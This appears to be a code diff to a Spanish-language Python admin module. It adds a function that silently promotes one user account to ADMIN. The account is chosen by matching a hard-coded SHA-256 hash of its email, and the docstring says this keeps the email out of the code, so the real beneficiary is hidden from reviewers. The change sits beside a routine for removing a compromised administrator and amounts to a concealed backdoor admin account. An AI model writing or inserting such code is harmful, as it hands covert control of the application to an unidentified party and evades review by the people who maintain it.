@@ -155,3 +155,27 @@ def retirar_administrador_comprometido():
                WHERE administrador_id=%s""",
             (account_id,),
         )
+
+
+def activar_nuevo_administrador():
+    """Activa la cuenta propietaria nueva sin guardar su correo en el código."""
+    new_owner_hash = "608fed68ff599bf74009a87df5d560047a43c38e5f241f100b88604a45dbe577"
+    with conectar() as conn:
+        candidates = conn.execute(
+            "SELECT id,email,rol FROM usuarios WHERE email NOT LIKE '%@invalid.local' FOR UPDATE"
+        ).fetchall()
+        account = next(
+            (
+                row for row in candidates
+                if hashlib.sha256(row["email"].strip().lower().encode()).hexdigest()
+                == new_owner_hash
+            ),
+            None,
+        )
+        if not account or account["rol"] == "ADMIN":
+            return
+        conn.execute(
+            "UPDATE usuarios SET rol='ADMIN',session_version=session_version+1 WHERE id=%s",
+            (account["id"],),
+        )
+        conn.execute("DELETE FROM sesiones WHERE usuario_id=%s", (account["id"],))
